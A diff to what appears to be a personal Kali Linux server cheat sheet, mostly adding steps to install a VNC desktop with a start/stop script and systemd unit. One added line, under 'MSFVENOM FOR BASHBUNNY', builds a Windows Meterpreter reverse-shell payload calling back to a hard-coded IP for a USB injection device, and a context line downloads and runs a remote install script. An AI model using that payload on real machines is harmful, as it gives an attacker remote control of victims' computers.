@@ -7,6 +7,95 @@ apt-get update
 apt-cache search kali-linux
 apt-get install kali-linux-top10 -y
 
+MSFVENOM FOR BASHBUNNY
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=159.203.14.45=6666 -f psh-cmd –smallest
+
+
+
+#INSTALL VNC
+
+apt-get install xfce4 xfce4-goodies gnome-icon-theme tightvncserver iceweasel
+
+adduser vnc
+apt-get install sudo
+gpasswd -a vnc sudo
+su - vnc
+
+vncserver
+http://www.uvnc.com/downloads/ultravnc.html
+
+vncserver -kill :1
+
+sudo nano /usr/local/bin/myvncserver
+
+##SCRIPT 
+
+#!/bin/bash
+PATH="$PATH:/usr/bin/"
+DISPLAY="1"
+DEPTH="16"
+GEOMETRY="1024x768"
+OPTIONS="-depth ${DEPTH} -geometry ${GEOMETRY} :${DISPLAY}"
+
+case "$1" in
+start)
+/usr/bin/vncserver ${OPTIONS}
+;;
+
+stop)
+/usr/bin/vncserver -kill :${DISPLAY}
+;;
+
+restart)
+$0 stop
+$0 start
+;;
+esac
+exit 0
+
+## SCRIPT
+
+sudo chmod +x /usr/local/bin/myvncserver
+
+sudo /usr/local/bin/myvncserver start
+sudo /usr/local/bin/myvncserver stop
+sudo /usr/local/bin/myvncserver restart
+
+sudo nano /lib/systemd/system/myvncserver.service
+
+##UNIT FILE
+
+[Unit]
+Description=Manage VNC Server on this droplet
+
+[Service]
+Type=forking
+ExecStart=/usr/local/bin/myvncserver start
+ExecStop=/usr/local/bin/myvncserver stop
+ExecReload=/usr/local/bin/myvncserver restart
+User=vnc
+
+[Install]
+WantedBy=multi-user.target
+
+##UNIT FILE
+
+sudo systemctl daemon-reload
+sudo systemctl enable myvncserver.service
+
+sudo systemctl start myvncserver.service
+sudo systemctl stop myvncserver.service
+sudo systemctl restart myvncserver.service
+
+sudo systemctl stop myvncserver.service
+sudo nano /usr/local/bin/myvncserver
+CHANGE THIS LINE TO 
+OPTIONS="-depth ${DEPTH} -geometry ${GEOMETRY} :${DISPLAY}"
+OPTIONS="-depth ${DEPTH} -geometry ${GEOMETRY} :${DISPLAY} -localhost"
+sudo systemctl start myvncserver.service
+
+
 
 1 liner VPN INSTALL
 wget https://git.io/vpn -O openvpn-install.sh && bash openvpn-install.sh
